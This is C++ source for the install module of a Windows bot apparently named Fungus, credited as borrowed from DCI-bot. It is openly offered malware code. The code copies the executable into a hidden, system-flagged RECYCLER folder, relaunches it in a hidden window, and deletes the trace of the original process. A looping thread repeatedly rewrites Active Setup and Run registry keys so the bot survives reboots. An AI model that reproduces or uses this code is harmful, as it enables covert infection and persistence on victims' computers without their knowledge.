/*
   ___                                           
 /'___\                                          
/\ \__/  __  __    ___      __   __  __    ____  
\ \ ,__\/\ \/\ \ /' _ `\  /'_ `\/\ \/\ \  /',__\  by Zax0mA
 \ \ \_/\ \ \_\ \/\ \/\ \/\ \L\ \ \ \_\ \/\__, `\
  \ \_\  \ \____/\ \_\ \_\ \____ \ \____/\/\____/ LITE
   \/_/   \/___/  \/_/\/_/\/___L\ \/___/  \/___/ 
                            /\____/              
                            \_/__/     
							                                              
  mInstall.cpp
  -> Install Module; Credits to Iserdo (taken from DCI-bot)
*/

#include "includes.h"
#include "externs.h"


               
DWORD WINAPI RemoteREGThread(LPVOID myvoid)
{
	HKEY		reg;
	char		szTemp[256], szModule[MAX_PATH];
        GetModuleFileName(0, szModule, sizeof(szModule));

   

	for (;;)
	{
		szTemp[0] = 0;
		strcat(szTemp, "Software\\Microsoft\\Active Setup\\Installed Components");
		strcat(szTemp, "\\");
		strcat(szTemp, "{08B0E5C0-4FCB-11CF-AAX5-00401C608512}");

		if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, szTemp, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL) == ERROR_SUCCESS)
		{
			RegSetValueEx(reg, "StubPath", 0, REG_SZ, (const unsigned char *)szModule, lstrlen(szModule));
			RegCloseKey(reg);

			RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Active Setup\\Installed Components", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
			RegDeleteKey(reg, "{08B0E5C0-4FCB-11CF-AAX5-00401C608512}");
			RegCloseKey(reg);

			if (pending > 0)
			{
				if (pending == 2)
				{
					RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Active Setup\\Installed Components", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
					RegDeleteKey(reg, "{08B0E5C0-4FCB-11CF-AAX5-00401C608512}");
					RegCloseKey(reg);
				}
				ExitThread(0);
			}
		}
		else
		{
			RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
			RegSetValueEx(reg, "Tester", 0, REG_SZ, (const unsigned char *)szModule, lstrlen(szModule));
			RegCloseKey(reg);

			if (pending > 0)
			{
				if (pending == 2)
				{
					RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
					RegDeleteValue(reg, "Tester");
					RegCloseKey(reg);
				}
				ExitThread(0);
			}
		}

		Sleep(2000);
	}
}

void BotInstall(void)
{
    char szTemp[MAX_PATH], szTemp2[MAX_PATH];
	HANDLE		f;
    char c[MAX_PATH] = "C:";
    char module[MAX_PATH];
    DWORD		id, d;

	GetModuleFileName(0, module, sizeof(module));
	// create location to copy to
	szTemp[0] = 0;
	strcat(szTemp, c);
	strcat(szTemp, USB_STR_RECYCLER);
	CreateDirectory(szTemp, NULL);
	SetFileAttributes(szTemp, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	strcat(szTemp, USB_STR_REC_SUBDIR);
	CreateDirectory(szTemp, NULL);
	SetFileAttributes(szTemp, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	StrCpyN(szTemp2, szTemp, MAX_PATH);
	strcat(szTemp2, USB_STR_DESKTOP_INI);
	f = CreateFile(szTemp2, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (f >= (HANDLE)1)
	{
		WriteFile(f, USB_STR_AUTORUN_DATA1, strlen(USB_STR_DESKTOP_DATA), &d, NULL);
	}
	CloseHandle(f);
	strcat(szTemp, "\\");
	strcat(szTemp, cfg_filename);

	// different locations, so copy me
	if (strcmpi(module, szTemp))
	{
		// try to delete file if already exists
		SetFileAttributes(szTemp, FILE_ATTRIBUTE_NORMAL);
		DeleteFile(szTemp);

		// copy file
		CopyFile(module, szTemp, FALSE);



		// save new location as our origin
		StrCpyN(module, szTemp, MAX_PATH);

		//execute new copy and "suicide"
		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		ZeroMemory(&pinfo,sizeof(pinfo));
		ZeroMemory(&sinfo,sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		sinfo.wShowWindow = SW_HIDE;
		if (CreateProcess(szTemp,NULL,NULL,NULL,TRUE,NORMAL_PRIORITY_CLASS|DETACHED_PROCESS,NULL, NULL ,&sinfo,&pinfo))
		{
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			WSACleanup();
			ExitProcess(0);
		}

	 ExitProcess(0);
	}

	// protect our exe file
	f = CreateFile(module, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0, 0); 

	Sleep(20*1000);

	// start reg thread
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RemoteREGThread, 0, 0, &id);


}